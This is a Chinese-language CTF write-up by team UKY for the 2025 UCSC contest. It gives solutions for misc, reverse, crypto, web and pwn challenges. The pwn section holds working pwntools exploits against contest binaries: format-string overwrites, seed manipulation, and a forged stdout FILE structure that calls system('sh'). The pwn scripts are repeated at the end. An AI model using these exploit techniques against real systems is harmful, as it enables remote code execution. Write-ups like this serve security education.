# UKY 2025UCSC WP

> 原文: https://www.ctfiot.com/244129.html
> ID: 244129

比赛地址：https://ctf.megrezsec.cn

比赛时间：2025年04月20日09:00-17:00（8小时）

本次比赛UKY位列第四名。

题解中包含部分未解出题目。

Misc

小套不是套

首先得到一张二维码和两个压缩包

二维码扫描有：

!@#QWE123987

但是只能解压test.zip，得到一个伪加密的mushroom.zip，解压得到一张蘑菇的照片，然而在010editor打开可以发现有IDAT之类的与png有关的信息，将其剪切出来，同时我们需要加上png文件头（89504E47），如图：

保存得到的是一张你的名字图片：

因为还有一个套.zip，所以而且它是真加密，所以我们需要从图片中找到解压密码（试过爆破了）

所以这里可能思路：

1.因为图片在随波逐流里面有提示后有文本隐写，并给出了额外的数据，所以可能是该数据可以被压缩为和zip包里面的文件CRC一样的包，然后进行明文攻击

2.图片隐写

three-ucs

part1：

明显是blindwatermask工具的使用，这里出题人已经把工具放这里了。java -jar BlindWatermark-v0.0.3.jar decode -f signwithflag.png flag.png

得到：

可以看到：

part1：8f02d3e7

part2：

0100110001010011001101000111010101001100011010010011010001110100010010010100001100110000011101010100110001010011001101000110011101001100011010010100000101110100010011000101001100110000011101010100110001101001010000010111010001001100010100110011000001110100010011000110100101000001011101000100110001101001001101000111010101001100011010010011000001100111010011000110100100110100011101010100110001101001001100000110011101001100010100110011010001110101010010010100001100110000011101010100110001101001001101000111010101001001010000110011000001110101010011000110100100110100011001110100110001010011001101000111010101001100011010010011010001110100010010010100001100110000011101000100110001010011001101000111010101001001010000110011010001110101010011000110100100110000011101000100100101000011001100000111010001001100010100110011000001110100010010010100001100110100011001110100110001010011001101000111010101001100011010010011010001110100

转为ASCII为：

LS4uLi4tIC0uLS4gLiAtLS0uLiAtLS0tLiAtLi4uLi0gLi4uLi0gLS4uIC0uLi4uIC0uLi4gLS4uLi4tIC0tLS4uIC4uLi0tIC0tLS0tIC4gLS4uLi4t

base64解码得到：

-….- -.-. . —.. —-. -….- ….- -.. -…. -… -….- —.. …– —– . -….-

摩斯解码得到：

-ce89-4d6b-830e-

part3：一个真加密的压缩包

但是有个pass.pcapng，流量包一把梭得到一些密码：

解压密码是thinkbell

解压得到part3.txt，内容是5d0cb5695077

即为：

flag{8f02d3e7-ce89-4d6b-830e-5d0cb5695077}

No.shArk|未解出

一个流量包，直接一把梭得到：

同时在流量包里面也发现了：

keyis:keykeyishere

同时snow.doc文档介绍了snow – 用于文本文件中隐藏信息的工具

用法：

snow [ -CQS ] [ -p 密码 ] [ -l 行长度 ] [ -f 文件 | -m 消息 ] [ 输入文件 [ 输出文件 ] ]

选项：

-C：隐藏数据时压缩数据，提取数据时解压缩数据。

-Q：安静模式。如果不设置，程序将报告诸如压缩百分比和已使用的可用存储空间量等统计信息。

-S：报告文本文件中可用于隐藏消息的大致空间量。考虑行长度，但忽略其他选项。

-p 密码：如果设置了此选项，数据将在隐藏时使用此密码加密，或在提取时解密。

-l 行长度：当添加空白字符时，snow始终会生成短于此值的行。默认值为80。

-f 消息文件：此文件的内容将被隐藏在输入文本文件中。

-m 消息字符串：此字符串的内容将被隐藏在输入文本文件中。注意，除非以某种方式在字符串中包含换行符，否则在提取消息时不会打印换行符。

根据snow隐写的特性，更加关注html文件（SNOW 隐写又被称为 HTML 隐写），流量包中在导出对象中找到：

打开后为：

尝试：

明显存在3位残余数据未解压，

USB-ucsc

USB流量分析：

就是简单的键盘流量分析，用脚本提取数据也行，一把梭也行

即为flag{ebdfea9b-3469-41c7-9070-d7833ecc6102}

pwn -ak

Userlogin

不用root函数，使用supersecureuser两次格式化字符串漏洞就可以getshell

#!/usr/bin/env python3from pwn import *context(arch = "amd64" , os = "linux" , log_level = "debug")#io = process("./pwwn")io = remote("39.107.58.236",49151)'''io = gdb.debug("./pwwn",""" decompiler connect ida --host 192.168.241.85 --port 3662                            b *0x4012B0                            c""")'''key                         = b"supersecureuser"io.sendlineafter(b"Password:",key)payload                     = b"%10$p"io.sendafter(b"thing",payload.ljust(0x20,b"x00"))io.recvuntil(b"0x")stack_base                  = int(io.recvn(12),16)success(f"stack_base        => {hex(stack_base)}")#0x7fffffffdf10io.sendlineafter(b"Password:",key)shell                       = 0x1262ret_addr                    = stack_base - 0x78payload2                    = b"%" + str(shell).encode() + b"c%9$hn"io.sendafter(b"thing",payload2.ljust(0x18,b"x00")+p64(ret_addr))io.interactive()

BoFido

name覆盖随机数种子为0，依次输入最后执行后门函数

#!/usr/bin/env python3from pwn import *context(arch = "amd64" , os = "linux" , log_level = "debug")io = process("./BoFido")io = remote("39.107.58.236",44295)'''io = gdb.debug("./BoFido",""" decompiler connect ida --host 192.168.241.85 --port 3662                                b *0x4013a2                                c""")'''io.sendafter(b"name:",b"x11"*0x20+b"x00"*5)rand = process("./rand")for i in range(10):    rand.recvuntil(b"Now,rand_num is:")    rand_num1                   = int(rand.recvuntil(b"x0a")[:-1],10)    rand.recvuntil(b"Now,rand_num is:")    rand_num2                   = int(rand.recvuntil(b"x0a")[:-1],10)    rand.recvuntil(b"Now,rand_num is:")    rand_num3                   = int(rand.recvuntil(b"x0a")[:-1],10)    success(f"rand_num          => {hex(rand_num1)}")    success(f"rand_num          => {hex(rand_num2)}")    success(f"rand_num          => {hex(rand_num3)}")    io.sendafter(b"numbers:",str(rand_num1).encode()+b" ")    io.send(str(rand_num2).encode()+b" ")    io.send(str(rand_num3).encode()+b" ")rand.close()io.interactive()

疯狂复制

每个函数都没有对idx的下限检查

同时Page的低位就是stdout的指针，利用edit函数改掉_IO_2_1_stdout_结构体实现io_leak，得到libc

最后大改_IO_2_1_stdout_结构体，利用puts走这个链_IO_wfile_overflow -> _IO_wdoallocbuf -> system，其实是设置虚拟表的偏移，第一次尝试用puts触发io链，结构体改的乱七八糟，底子用的是house_of_apple2的，但是几乎是全改

#!/usr/bin/env python3from pwn import *context(arch = "amd64" , os = "linux" , log_level = "debug")io = process("./pwwn")io = remote("39.107.58.236",40967)'''io = gdb.debug("./pwwn","""  decompiler connect ida --host 192.168.241.85 --port 3662                            b *0x555555400c8f                            c                            """)'''libc                        = ELF("./libc.so.6")def mune(choice):    io.sendlineafter(b":",str(choice).encode())def add(idx,size):    mune(1)    io.sendlineafter(b":",str(idx).encode())    io.sendlineafter(b"ize",str(size).encode())def edit(idx,content):    mune(2)    mune(idx)    io.sendlineafter(b":",content)def show(idx):    mune(3)    mune(idx)def free(idx):    mune(4)    mune(idx)add(0x1e,0x10)edit(-4,p64(0xfbad1887)+p64(0)*3)libc_base                   = u64(io.recvuntil(b"x7f")[-6:].ljust(8,b"x00")) - 0x3ed8b0libc2                       = u64(io.recvuntil(b"x7f")[-6:].ljust(8,b"x00")) - 0x3eb780success(f"libc_base         => {hex(libc_base)}")success(f"libc2             => {hex(libc2)}")add(-5,0x10)add(0,0x60)add(1,0x60)'''gdb.attach(io,"""decompiler connect ida --host 192.168.241.85 --port 3662                    b *0x555555400bcb                    c""")'''###########################################################################libc_base      =#heap_base      =io_list_all     = libc_base + libc.sym["_IO_list_all"]io_wfile_jumps  = libc_base + libc.sym["_IO_wfile_jumps"]#maybe request the off is numfake_io_addr    = libc_base + libc.sym["_IO_2_1_stdout_"]wide_date       = fake_io_addr + 0xe0 flag            = wide_datefunc            = libc_base + libc.sym["system"]end             = fake_io_addr + 0xe0 + 0x150 + 0x8fake_io_file = flat({        0:      b"  sh",                              #_flag        0x8:    p64(0),                #io_read_ptr        0x10:   p64(1),                        #io_read_end   <----fd        0x18:   p64(2),                        #io_read_base  <----bk        0x20:   b"  sh",                      #io_write_base <----fd_n        0x28:   p64(io_list_all - 0x20),        #io_write_ptr  <----tar_addr        0x48:   0,                              #io_save_base        0x88:   p64(libc_base+0x3eb000),                 #lock         0xa0:   p64(wide_date),                 #wide_date        0xa8:   p64(fake_io_addr+8),        0xc0:   p64(fake_io_addr+0x18),        0xd8:   p64(io_wfile_jumps)             #vtable        },filler=b"x00",length = 0xe0)wide_struct = flat({                0:      b"xff"*4,        0x8:    p64(fake_io_addr+0x20),        0x18:     p64(io_wfile_jumps-0x20),        0x68:   p64(fake_io_addr+0xe0+0xe8),        0xe0:   p64(wide_date+0xe8),            #wide_vtable        0x150:  p64(func)                       #              <----func        },filler = b"x00",length = 0x158)##########################################################################payload         = fake_io_file + wide_structedit(-4,payload)#gdb.attach(io,"""decompiler connect ida --host 192.168.241.85 --port 3662""")io.interactive()

Reverse -ak

easy_re

主逻辑异或

data=b"n=<;:h2<'?8:?'9hl9'h:l>'2>>2>hk=>;:?"for i in range(len(data)):         print(chr(data[i]^10),end='')

flag{d7610b86-5205-3bf3-b0f4-84484ba74105}

simplere

魔改UPX，特征字节码变了，CTF改成UPX就可以工具脱

主逻辑一个异或一个加密

*136/100+1，一眼base58变表（wmGbyFp7WeLh2XixZUYsS5cVv1ABRrujdzQ4Kfa6gP8HJN3nTCktqEDo9M）

逆异或：

data=[  0x72, 0x7A, 0x32, 0x48, 0x34, 0x4E, 0x3F, 0x3A, 0x42, 0x33,   0x47, 0x69, 0x75, 0x63, 0x7C, 0x7D, 0x77, 0x62, 0x65, 0x64,   0x7B, 0x6F, 0x62, 0x50, 0x73, 0x2B, 0x68, 0x6C, 0x67, 0x47,   0x69, 0x15, 0x42, 0x75, 0x65, 0x40, 0x76, 0x61, 0x56, 0x41,   0x11, 0x44, 0x7F, 0x19, 0x65, 0x4C, 0x40, 0x48, 0x65, 0x60,   0x01, 0x40, 0x50, 0x01, 0x61, 0x6F, 0x69, 0x57, 0x00]flag=[0]*100for i in range(len(data)):    flag[len(data)-i-1]=data[i]^(i+1)for i in range(len(data)):    print(chr(flag[i]),end='')    # ;mPWV7et2RTxobH5Tn8iqGSdFWc5vYzps1jHuynpvpfmsmxeL9K28H1L1xs

厨子：

flag{0ba878d9-8bb5-11ef-b419-a4b1c1c5a2d2}

EZ_debug

rc4加密，给密文给key给参数……emmm动调就有结果了

flag{709e9bdd-0858-9750-8c37-9b135b31f16d}

re_ez

程序要求v0 == 3,可用数字为 -5，5，-1，1

输入：

感觉这个是用opcode的计算顺序得到的v0=3，用-5 5 1 -1经过加法得到的

还要满足这个不退出

同时data[v0]不为1

Data:

1,0,1,0,1,1,0,1,0,1,1,0,1,0,1,1,0,0,0,1,1,1,1,1,1

根据这个找到就行了，当然这种短的BFS直接deepseek一把梭😋

最短路径：+5, +5, +5, +1, +1, -5, -5, -5

索引数组[-5,5,-1,1]

然后找到对应索引逆向再求md5值

int main(){        char data[] = {+5, +5, +5, +1, +1, -5, -5, -5};        char input[100];        int len = strlen(data);        for(int i=0;i<len;i++){                if(data[i] == 5){                        input[i] = 1;                }                if(data[i] == -5){                        input[i] = 0;                }                if(data[i] == -1){                        input[i] = 2;                }                if(data[i] == 1){                        input[i] = 3;                }        }         for(int i=0;i<len;i++){                input[i] = (input[i]^3)+32;        }        for(int i=0;i<len;i++){                printf("%x",input[i]);        }}

import hashlibhex_string = "2222222020232323"byte_data = bytes.fromhex(hex_string)md5_hash = hashlib.md5(byte_data).hexdigest()print( md5_hash)

flag{c4eb11b0e0a3cbeed7df057deaec18aa}

我告诉你们一个事，你俩都记得，要求md5值别用赛博厨子

我早就发现这个厨子求MD5特别不准，用py

厨子的md5有时候是对的有时候是错的……

Crypto

XR4

很常规的RC4

import base64import randomimport numpy as np# 给定的矩阵matrix = np.array([    [1, 111, 38, 110, 95, 44],    [11, 45, 58, 39, 84, 1],    [116, 19, 113, 60, 91, 118],    [33, 98, 38, 57, 10, 29],    [68, 52, 119, 56, 43, 125],    [32, 32, 7, 26, 41, 41]])transposed_matrix = matrix.Tdata = transposed_matrix.flatten()def init_sbox(key):    s_box = list(range(256))    j = 0    for i in range(256):        j = (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] = s_box[j], s_box[i]    return s_boxdef decrypt(cipher, box):    res = []    i = j = 0    cipher_bytes = base64.b64decode(cipher)    for s in cipher_bytes:        i = (i + 1) % 256        j = (j + box[i]) % 256        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % 256        k = box[t]        res.append(chr(s ^ k))    return ''.join(res)def random_num(seed_num):    random.seed(seed_num)    result = []    for i in range(len(data)):        result.append(chr(int(str(random.random() * 10000)[0:2]) ^ data[i]))    return ''.join(result)if __name__ == '__main__':    ciphertext = "MjM184anvdA="    key = "XR4"    box = init_sbox(key)    a = decrypt(ciphertext, box)    seed_num = int(a)    result = random_num(seed_num)    print("解密结果:", result)#c570ee41-8b09-11ef-ac4a-a4b1c1c5a2d2

essential-ucsc

就是两个RSA，p q相近分解n

from Crypto.Util.number import *from tqdm import *from sympy import *import gmpy2flag1=6624758244437183700228793390575387439910775985543869953485120951825790403986028668723069396276896827302706342862776605008038149721097476152863529945095435498809442643082504012461883786296234960634593997098236558840899107452647003306820097771301898479134315680273315445282673421302058215601162967617943836306076flag2=204384474875628990804496315735508023717499220909413449050868658084284187670628949761107184746708810539920536825856744947995442111688188562682921193868294477052992835394998910706435735040133361347697720913541458302074252626700854595868437809272878960638744881154520946183933043843588964174947340240510756356766number1 = 6035830951309638186877554194461701691293718312181839424149825035972373443231514869488117139554688905904333169357086297500189578624512573983935412622898726797379658795547168254487169419193859102095920229216279737921183786260128443133977458414094572688077140538467216150378641116223616640713960883880973572260683number2 = 20163906788220322201451577848491140709934459544530540491496316478863216041602438391240885798072944983762763612154204258364582429930908603435291338810293235475910630277814171079127000082991765275778402968190793371421104016122994314171387648385459262396767639666659583363742368765758097301899441819527512879933947a = gmpy2.isqrt(number2 // 325)for delta in trange(-20, 20):    aa = a + delta    pp = nextprime(13 * aa)    qq = prevprime(25 * aa)    if pp * qq == number2:        a = aa        p = pp        q = qq        breakphi=(p-1)*(q-1)d1 = pow(number1, -1, phi)number3 = pow(flag1, d1, p*q)m1=long_to_bytes(number3).decode()e = 0xe18e//2m2=(gmpy2.iroot(pow(flag2,pow(e,-1,phi),p*q),2)[0])m2=long_to_bytes(m2).decode()print(m1+m2)

flag{75811c6d95770d56092817b75f15df05}

MERGE_ECC

椭圆曲线算法

part1，直接爆破

from gmpy2 import *from Crypto.Util.number import *from tqdm import *p = 8186762541745429544201163537921168767557829030115874801599552603320381728161132002130533050721684554609459754424458805702284922582219134865036743485620797a = 1495420997701481377470828570661032998514190598989197201754979317255564287604311958150666812378959018880028977121896929545639701195491870774156958755735447b = 5991466901412408757938889677965118882508317970919705053385317474407117921506012065861844241307270755999163280442524251782766457119443496954015171881396147E = EllipticCurve(GF(p), [a, b])P=E(6053058761132539206566092359337778642106843252217768817197593657660613775577674830119685211727923302909194735842939382758409841779476679807381619373546323 , 7059796954840479182074296506322819844555365317950589431690683736872390418673951275875742138479119268529134101923865062199776716582160225918885119415223226)c0 = E(4408587937721811766304285221308758024881057826193901720202053016482471785595442728924925855745045433966244594468163087104593409425316538804577603801023861 , 5036207336371623412617556622231677184152618465739959524167001889273208946091746905245078901669335908442289383798546066844566618503786766455892065155724816)c1 = E(2656427748146837510897512086140712942840881743356863380855689945832188909581954790770797146584513962618190767634822273749569907212145053676352384889228875 , 4010263650619965046904980178893999473955022015118149348183137418914551275841596653682626506158128955577872592363930977349664669161585732323838763793957500)c2 = E(1836350123050832793309451054411760401335561429787905037706697802971381859410503854213212757333551949694177845513529651742217132039482986693213175074097638 , 1647556471109115097539227566131273446643532340029032358996281388864842086424490493200350147689138143951529796293632149050896423880108194903604646084656434)'''for i in trange(651860,2**20):    point=i*P    if point in [c1,c2,c0]:        print(i)        '''n=[1008061,651602,943532]part1=''.join([hex(i)[2:] for i in n])print(part1)#f61bd9f152e65ac

part2，曲线的阶和模p相等，Smart’s attack

from Crypto.Util.number import *from gmpy2 import *def SmartAttack(P,Q,p):    E = P.curve()    Eqp = EllipticCurve(Qp(p, 2), [ ZZ(t) + randint(0,p)*p for t in E.a_invariants() ])    P_Qps = Eqp.lift_x(ZZ(P.xy()[0]), all=True)    for P_Qp in P_Qps:        if GF(p)(P_Qp.xy()[1]) == P.xy()[1]:            break    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[0]), all=True)    for Q_Qp in Q_Qps:        if GF(p)(Q_Qp.xy()[1]) == Q.xy()[1]:            break    p_times_P = p*P_Qp    p_times_Q = p*Q_Qp    x_P,y_P = p_times_P.xy()    x_Q,y_Q = p_times_Q.xy()    phi_P = -(x_P/y_P)    phi_Q = -(x_Q/y_Q)    k = phi_Q/phi_P    return ZZ(k)p =  839252355769732556552066312852886325703283133710701931092148932185749211043a =  166868889451291853349533652847942310373752202024350091562181659031084638450b =  168504858955716283284333002385667234985259576554000582655928538041193311381E = EllipticCurve(GF(p), [a, b])P =  E(547842233959736088159936218561804098153493246314301816190854370687622130932 , 259351987899983557442340376413545600148150183183773375317113786808135411950 )Q =  E(52509027983019069214323702207915994504051708473855890224511139305828303028 , 520507172059483331872189759719244369795616990414416040196069632909579234481 )part2=SmartAttack(P,Q,p)print(part2)

flag{f61bd9f152e65ac-7895892011}

Ez_Calculate-ucsc|三血

这就是我们热血沸腾的组合技

背包密码体制加上RSA

RSA，

Rabin密码超级加倍版

from Crypto.Util.number import *from tqdm import *from sympy import *from gmpy2 import *pro1 = 24819077530766367166035941051823834496451802693325219476153953490742162231345380863781267094224914358021972805811737102184859249919313532073566493054398702269142565372985584818560322911207851760003915310535736092154713396343146403645986926080307669092998175883480679019195392639696872929250699367519967334248pro2 = 20047847761237831029338089120460407946040166929398007572321747488189673799484690384806832406317298893135216999267808940360773991216254295946086409441877930687132524014042802810607804699235064733393301861594858928571425025486900981252230771735969897010173299098677357738890813870488373321839371734457780977243838253195895485537023584305192701526016n = 86262122894918669428795269753754618836562727502569381672630582848166228286806362453183099819771689423205156909662196526762880078792845161061353312693752568577607175166060900619163231849790003982326663277243409696279313372337685740601191870965951317590823292785776887874472943335746122798330609540525922467021c = 74962027356320017542746842438347279031419999636985213695851878703229715143667648659071242394028952959096683055640906478244974899784491598741415530787571499313545501736858104610426804890565497123850685161829628373760791083545457573498600656412030353579510452843445377415943924958414311373173951242344875240776e = 65536for k in range(1, 1000):    ek= pow(e, k, n)    tmp = (pro2 + pro1 * ek) % n    g = int(gcd(tmp, n))    if g != 1 and g != n:        p = g        q = n // g        breakdef rabin_decrypt(c, p, q):    n = p * q    if gcd(c, n) != 1:        return []    mp = pow(c, (p + 1) // 4, p)    mq = pow(c, (q + 1) // 4, q)    _, yp, yq = gmpy2.gcdext(p, q)    s1 = (yp * p * mq + yq * q * mp) % n    s2 = (-yp * p * mq + yq * q * mp) % n    s3 = (yp * p * mq - yq * q * mp) % n    s4 = (-yp * p * mq - yq * q * mp) % n
    return sorted([s1 % n, (-s1) % n, s2 % n, (-s2) % n])def recursive_rabin_decrypt(c, p, q, depth=3, candidates=None):    if candidates is None:        candidates = set()    if depth <= 0:        return candidates    current_candidates = rabin_decrypt(c, p, q)    for candidate in current_candidates:        if candidate in candidates:            continue        candidates.add(candidate)        recursive_rabin_decrypt(candidate, p, q, depth-1, candidates)    return candidatespossible_ms = recursive_rabin_decrypt(c, p, q,316)for i in possible_ms:    try:        print(long_to_bytes(i).decode())    except:        continue
b'CRYPTO_ALGORIT'

背包密码体制打算直接爆破了，毕竟空间也不算大，直接遍历所有的八位二进制数（0b00000000-0b11111111）

def backpack_decrypt(S_list, M, group_len):    from itertools import product    def find_combination(S, M):        for combination in product([0, 1], repeat=len(M)):            if sum(bit * m for bit, m in zip(combination, M)) == S:                return combination        return None    bits = []    for S in S_list:        combination = find_combination(S, M)        if combination is None:            raise ValueError()        bits.extend(combination)    flag_bytes = bytearray()    for i in range(0, len(bits), 8):        byte_bits = bits[i:i + 8]        byte = int("".join(map(str, byte_bits)), 2)         flag_bytes.append(byte)    return bytes(flag_bytes)M = [10294, 12213, 10071, 4359, 1310, 4376, 7622, 14783]S_list = [13523, 32682, 38977, 44663, 43353, 31372, 17899, 17899, 44663, 16589, 40304, 25521, 31372]group_len = 8try:    decrypted = backpack_decrypt(S_list, M, group_len)    print("解密结果:", decrypted.decode("utf-8"))except ValueError as e:    print(e)
b'HMS_WELL_DONE'

flag{64f67374264b7621650b1de4dbc5f924}

Lunz|未解出

又是RSA，但是有了一些很特殊的东西，我是没查到这后面的加密是什么方式。（后来查了一下标题，LUNZ貌似和这密码体系没有关系）

感觉可能要用格，有两个e，对应的d未知，有一种格就是算这个的，但是又不太一样

加密式子

n未知，所以就要用下面的一串求出p和q

而

，感觉有一些奇特的联系

Rod为只有5bit的素数，可能的值只有17，19，23，29，31，到时候爆破一下，Rod就当已知了

N已知，两个e已知，两个d之间比较相近，两个e之间也比较相近

Logos-ucsc|未解决

太好了，是离散对数，没救了(

part1，实数的离散对数

连个模n都不给，先求模

n=12678950975657299741597068411912062416064860044947808601914643744013304126427383015124254424611743563255955090464122259688914575568291283903299394351205692500871133501545531213799485768959306533230414644943482624700409916815759318739044018687973338648002804211522804066177661868100534535325735412249218310283015886278908741603922636130844503245613636493548724291249499974830056316859185616981333285839521223525116798814076692406285641401894824500197008400382785635909480872252432262141841000264287637746515381937883995916593910019661095765989048220216569126366442235246863172944976221290743542298269972228809424401801769662633772671719186693662002106484820857644985776465597319874967162438688474387497754296730464820382435506326614774763458148040539834576697984821453737194637363587735136007322668665970918790290243645898372232357604029104607102608143024457458750987754135722840754335947489288417170856530750123427202047782364216979182750690601240732694760124018983553163521760792016209336965606147608247167518675199176420761620913174080744534627902936051142166111466402551997069885468070937050584257171863360067262609635380320608633505446134439804513189525818985532978219967610683751460310798439035011903775497192826013515619261

part2，多项式的离散对数

part3，矩阵的离散对数

web -ak

ezLaravel-ucsc

访问/public/index.php显示ctf，尝试post一下

是个laravel框架，且开启了调试模式。本来想着是框架可能存在的漏洞，但这个版本貌似没找到。

尝试dirsearch

发现有flag.php，直接访问

flag{4863e73e-3dbc-48fe-bd19-05bc6571fb45}

qq群码


```
0100110001010011001101000111010101001100011010010011010001110100010010010100001100110000011101010100110001010011001101000110011101001100011010010100000101110100010011000101001100110000011101010100110001101001010000010111010001001100010100110011000001110100010011000110100101000001011101000100110001101001001101000111010101001100011010010011000001100111010011000110100100110100011101010100110001101001001100000110011101001100010100110011010001110101010010010100001100110000011101010100110001101001001101000111010101001001010000110011000001110101010011000110100100110100011001110100110001010011001101000111010101001100011010010011010001110100010010010100001100110000011101000100110001010011001101000111010101001001010000110011010001110101010011000110100100110000011101000100100101000011001100000111010001001100010100110011000001110100010010010100001100110100011001110100110001010011001101000111010101001100011010010011010001110100
```



```
#!/usr/bin/env python3from pwn import *context(arch = "amd64" , os = "linux" , log_level = "debug")#io = process("./pwwn")io = remote("39.107.58.236",49151)'''io = gdb.debug("./pwwn",""" decompiler connect ida --host 192.168.241.85 --port 3662                            b *0x4012B0                            c""")'''key                         = b"supersecureuser"io.sendlineafter(b"Password:",key)payload                     = b"%10$p"io.sendafter(b"thing",payload.ljust(0x20,b"x00"))io.recvuntil(b"0x")stack_base                  = int(io.recvn(12),16)success(f"stack_base        => {hex(stack_base)}")#0x7fffffffdf10io.sendlineafter(b"Password:",key)shell                       = 0x1262ret_addr                    = stack_base - 0x78payload2                    = b"%" + str(shell).encode() + b"c%9$hn"io.sendafter(b"thing",payload2.ljust(0x18,b"x00")+p64(ret_addr))io.interactive()
```



```
#!/usr/bin/env python3from pwn import *context(arch = "amd64" , os = "linux" , log_level = "debug")io = process("./BoFido")io = remote("39.107.58.236",44295)'''io = gdb.debug("./BoFido",""" decompiler connect ida --host 192.168.241.85 --port 3662                                b *0x4013a2                                c""")'''io.sendafter(b"name:",b"x11"*0x20+b"x00"*5)rand = process("./rand")for i in range(10):    rand.recvuntil(b"Now,rand_num is:")    rand_num1                   = int(rand.recvuntil(b"x0a")[:-1],10)    rand.recvuntil(b"Now,rand_num is:")    rand_num2                   = int(rand.recvuntil(b"x0a")[:-1],10)    rand.recvuntil(b"Now,rand_num is:")    rand_num3                   = int(rand.recvuntil(b"x0a")[:-1],10)    success(f"rand_num          => {hex(rand_num1)}")    success(f"rand_num          => {hex(rand_num2)}")    success(f"rand_num          => {hex(rand_num3)}")    io.sendafter(b"numbers:",str(rand_num1).encode()+b" ")    io.send(str(rand_num2).encode()+b" ")    io.send(str(rand_num3).encode()+b" ")rand.close()io.interactive()
```



```
#!/usr/bin/env python3from pwn import *context(arch = "amd64" , os = "linux" , log_level = "debug")io = process("./pwwn")io = remote("39.107.58.236",40967)'''io = gdb.debug("./pwwn","""  decompiler connect ida --host 192.168.241.85 --port 3662                            b *0x555555400c8f                            c                            """)'''libc                        = ELF("./libc.so.6")def mune(choice):    io.sendlineafter(b":",str(choice).encode())def add(idx,size):    mune(1)    io.sendlineafter(b":",str(idx).encode())    io.sendlineafter(b"ize",str(size).encode())def edit(idx,content):    mune(2)    mune(idx)    io.sendlineafter(b":",content)def show(idx):    mune(3)    mune(idx)def free(idx):    mune(4)    mune(idx)add(0x1e,0x10)edit(-4,p64(0xfbad1887)+p64(0)*3)libc_base                   = u64(io.recvuntil(b"x7f")[-6:].ljust(8,b"x00")) - 0x3ed8b0libc2                       = u64(io.recvuntil(b"x7f")[-6:].ljust(8,b"x00")) - 0x3eb780success(f"libc_base         => {hex(libc_base)}")success(f"libc2             => {hex(libc2)}")add(-5,0x10)add(0,0x60)add(1,0x60)'''gdb.attach(io,"""decompiler connect ida --host 192.168.241.85 --port 3662                    b *0x555555400bcb                    c""")'''###########################################################################libc_base      =#heap_base      =io_list_all     = libc_base + libc.sym["_IO_list_all"]io_wfile_jumps  = libc_base + libc.sym["_IO_wfile_jumps"]#maybe request the off is numfake_io_addr    = libc_base + libc.sym["_IO_2_1_stdout_"]wide_date       = fake_io_addr + 0xe0 flag            = wide_datefunc            = libc_base + libc.sym["system"]end             = fake_io_addr + 0xe0 + 0x150 + 0x8fake_io_file = flat({        0:      b"  sh",                              #_flag        0x8:    p64(0),                #io_read_ptr        0x10:   p64(1),                        #io_read_end   <----fd        0x18:   p64(2),                        #io_read_base  <----bk        0x20:   b"  sh",                      #io_write_base <----fd_n        0x28:   p64(io_list_all - 0x20),        #io_write_ptr  <----tar_addr        0x48:   0,                              #io_save_base        0x88:   p64(libc_base+0x3eb000),                 #lock         0xa0:   p64(wide_date),                 #wide_date        0xa8:   p64(fake_io_addr+8),        0xc0:   p64(fake_io_addr+0x18),        0xd8:   p64(io_wfile_jumps)             #vtable        },filler=b"x00",length = 0xe0)wide_struct = flat({                0:      b"xff"*4,        0x8:    p64(fake_io_addr+0x20),        0x18:     p64(io_wfile_jumps-0x20),        0x68:   p64(fake_io_addr+0xe0+0xe8),        0xe0:   p64(wide_date+0xe8),            #wide_vtable        0x150:  p64(func)                       #              <----func        },filler = b"x00",length = 0x158)##########################################################################payload         = fake_io_file + wide_structedit(-4,payload)#gdb.attach(io,"""decompiler connect ida --host 192.168.241.85 --port 3662""")io.interactive()
```



```
data=b"n=<;:h2<'?8:?'9hl9'h:l>'2>>2>hk=>;:?"for i in range(len(data)):         print(chr(data[i]^10),end='')
```



```
data=[  0x72, 0x7A, 0x32, 0x48, 0x34, 0x4E, 0x3F, 0x3A, 0x42, 0x33,   0x47, 0x69, 0x75, 0x63, 0x7C, 0x7D, 0x77, 0x62, 0x65, 0x64,   0x7B, 0x6F, 0x62, 0x50, 0x73, 0x2B, 0x68, 0x6C, 0x67, 0x47,   0x69, 0x15, 0x42, 0x75, 0x65, 0x40, 0x76, 0x61, 0x56, 0x41,   0x11, 0x44, 0x7F, 0x19, 0x65, 0x4C, 0x40, 0x48, 0x65, 0x60,   0x01, 0x40, 0x50, 0x01, 0x61, 0x6F, 0x69, 0x57, 0x00]flag=[0]*100for i in range(len(data)):    flag[len(data)-i-1]=data[i]^(i+1)for i in range(len(data)):    print(chr(flag[i]),end='')    # ;mPWV7et2RTxobH5Tn8iqGSdFWc5vYzps1jHuynpvpfmsmxeL9K28H1L1xs
```



```
1,0,1,0,1,1,0,1,0,1,1,0,1,0,1,1,0,0,0,1,1,1,1,1,1
```



```
int main(){        char data[] = {+5, +5, +5, +1, +1, -5, -5, -5};        char input[100];        int len = strlen(data);        for(int i=0;i<len;i++){                if(data[i] == 5){                        input[i] = 1;                }                if(data[i] == -5){                        input[i] = 0;                }                if(data[i] == -1){                        input[i] = 2;                }                if(data[i] == 1){                        input[i] = 3;                }        }         for(int i=0;i<len;i++){                input[i] = (input[i]^3)+32;        }        for(int i=0;i<len;i++){                printf("%x",input[i]);        }}
```



```
import hashlibhex_string = "2222222020232323"byte_data = bytes.fromhex(hex_string)md5_hash = hashlib.md5(byte_data).hexdigest()print( md5_hash)
```



```
import base64import randomimport numpy as np# 给定的矩阵matrix = np.array([    [1, 111, 38, 110, 95, 44],    [11, 45, 58, 39, 84, 1],    [116, 19, 113, 60, 91, 118],    [33, 98, 38, 57, 10, 29],    [68, 52, 119, 56, 43, 125],    [32, 32, 7, 26, 41, 41]])transposed_matrix = matrix.Tdata = transposed_matrix.flatten()def init_sbox(key):    s_box = list(range(256))    j = 0    for i in range(256):        j = (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] = s_box[j], s_box[i]    return s_boxdef decrypt(cipher, box):    res = []    i = j = 0    cipher_bytes = base64.b64decode(cipher)    for s in cipher_bytes:        i = (i + 1) % 256        j = (j + box[i]) % 256        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % 256        k = box[t]        res.append(chr(s ^ k))    return ''.join(res)def random_num(seed_num):    random.seed(seed_num)    result = []    for i in range(len(data)):        result.append(chr(int(str(random.random() * 10000)[0:2]) ^ data[i]))    return ''.join(result)if __name__ == '__main__':    ciphertext = "MjM184anvdA="    key = "XR4"    box = init_sbox(key)    a = decrypt(ciphertext, box)    seed_num = int(a)    result = random_num(seed_num)    print("解密结果:", result)#c570ee41-8b09-11ef-ac4a-a4b1c1c5a2d2
